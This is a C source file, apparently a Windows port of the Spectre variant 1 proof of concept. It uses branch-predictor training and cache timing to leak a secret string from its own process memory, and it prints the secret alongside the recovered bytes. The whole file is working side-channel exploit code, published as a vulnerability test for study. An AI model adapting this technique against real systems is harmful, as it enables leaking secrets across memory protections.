/*
Spectre vulnerability experimental test for Windows.
Based on the Spectre paper : https://spectreattack.com/spectre.pdf

Changes applied on the original source code :
- CPU without the rdtscp instruction support added.
- Looping mode.
- Debug/detailed mode can be enabled/disabled.

Jean-François DEL NERO (06 January 2018)
*/

#include "stdafx.h"

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <windows.h>
#ifdef _MSC_VER
#include <intrin.h>
/* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h>
/* for rdtscp and clflush */
#endif


/********************************************************************
Victim code.
*******************************************************************/
uint32_t regs[4];
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
uint8_t unused2[64];
uint8_t array2[256 * 512];
char *secret = "The Magic Words are Squeamish Ossifrage.";
#define STRINGLEN 40;

uint8_t temp = 0;

/* Used so compiler won’t optimize out victim_function() */
void victim_function(size_t x) {
	if (x < array1_size) {
		temp &= array2[array1[x] * 512];
	}
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80)

/* assume cache hit if time <= threshold */
/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2], int rdtscp_available)
{
	static int results[256];
	int tries, i, j, k, mix_i, junk = 0;
	size_t training_x, x;
	register uint64_t time1, time2;
	volatile uint8_t *addr;

	for (i = 0; i < 256; i++)
		results[i] = 0;

	for (tries = 999; tries > 0; tries--) {

		/* Flush array2[256*(0..255)] from cache */
		for (i = 0; i < 256; i++)
			_mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */

										   /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
		training_x = tries % array1_size;
		for (j = 29; j >= 0; j--) {
			_mm_clflush(&array1_size);

			for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */

													  /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
													  /* Avoid jumps in case those tip off the branch predictor */
			x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
			x = (x | (x >> 16));         /* Set x=-1 if j&6=0, else x=0 */
			x = training_x ^ (x & (malicious_x ^ training_x));

			/* Call the victim! */
			victim_function(x);
		}

		/* Time reads. Order is lightly mixed up to prevent stride prediction */
		if (rdtscp_available)
		{
			for (i = 0; i < 256; i++) {
				mix_i = ((i * 167) + 13) & 255;
				addr = &array2[mix_i * 512];

				time1 = __rdtscp((unsigned int *)&junk);

				/* READ TIMER */
				junk = *addr;

				/* MEMORY ACCESS TO TIME */
				time2 = __rdtscp((unsigned int *)&junk) - time1;

				/* READ TIMER & COMPUTE ELAPSED TIME */
				if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
					results[mix_i]++;  /* cache hit - add +1 to score for this value */
			}
		}
		else
		{
			for (i = 0; i < 256; i++) {
				mix_i = ((i * 167) + 13) & 255;
				addr = &array2[mix_i * 512];

				_mm_lfence();
				time1 = __rdtsc();

				/* READ TIMER */
				junk = *addr;

				/* MEMORY ACCESS TO TIME */
				_mm_lfence();
				time2 = __rdtsc();

				time2 = (time2 - time1);

				/* READ TIMER & COMPUTE ELAPSED TIME */
				if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
					results[mix_i]++;  /* cache hit - add +1 to score for this value */
			}
		}

		/* Locate highest & second-highest results results tallies in j/k */
		j = k = -1;
		for (i = 0; i < 256; i++) {
			if (j < 0 || results[i] >= results[j])
			{
				k = j;
				j = i;
			}
			else if (k < 0 || results[i] >= results[k])
			{
				k = i;
			}
		}

		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
			break;
		/* Clear success if best is > 2*runner-up + 5 or 2/0) */
	}

	results[0] ^= junk; /* use junk so code above won’t get optimized out*/
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];
}

int main(int argc, const char **argv) {
	size_t malicious_x;
	int i, score[2], len, debug_mode;
	uint8_t value[2];
	unsigned char recovered[512], rdtscp_available;

	debug_mode = 0;

	printf("Spectre vulnerability experimental test for Windows\n");
	printf("Based on the Spectre paper : https://spectreattack.com/spectre.pdf\n");
	printf("Modifications done by Jean-Francois DEL NERO (06 January 2018)\n");
	printf("Press Return to quit, F1 to toggle debug output\n\n");

	// Extract the CPU vendor ID + CPU Features
	__cpuid((int *)regs, (int)0x00000000);
	printf("CPU Vendor : %.8X.%.8X.%.8X\n", regs[1], regs[2], regs[3]);
	__cpuid((int *)regs, (int)0x00000001);
	printf("CPU Info   : 0x%.8X 0x%.8X 0x%.8X 0x%.8X\n", regs[0], regs[1], regs[2], regs[3]);

	// Check the rdtscp availibility
	rdtscp_available = 1;
	__cpuid((int *)regs, (int)0x80000001);
	if (!(regs[3] & 0x08000000))
	{
		printf("rdtscp NOT available... using rdtsc instead...\n");
		rdtscp_available = 0;
	}
	printf("\n");

	do
	{
		if (GetKeyState(VK_F1) & 0x80000000)
		{
			debug_mode ^= 1;
		}

		len = STRINGLEN;
		malicious_x = (size_t)(secret - (char*)array1);
		memset(recovered, 0, sizeof(recovered));

		for (i = 0; i < sizeof(array2); i++)
			array2[i] = 1;  /* write to array2 so in RAM not copy-on-write zero pages */

		printf("Reading %d bytes:\n", len);
		len = 40;
		i = 0;
		while (--len >= 0) {
			if (debug_mode)
				printf("Reading at malicious_x = %p... ", (void*)malicious_x);

			readMemoryByte(malicious_x++, value, score, rdtscp_available);

			if (debug_mode)
			{
				printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
				printf("0x%02X= [%c]  score=%d    ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
			}

			recovered[i] = (value[0] > 31 && value[0] < 127 ? value[0] : '?');

			if (debug_mode)
			{
				if (score[1] > 0)
					printf("(second best: 0x%02X score=%d)", value[1], score[1]);

				printf("\n");
			}
			i++;
		}

		printf("Secret    : %s\n", secret);
		printf("Recovered : %s\n", recovered);
		printf("\n");

		Sleep(1000);
	} while (!(GetKeyState(VK_RETURN) & 0x80000000));

	return (0);
}
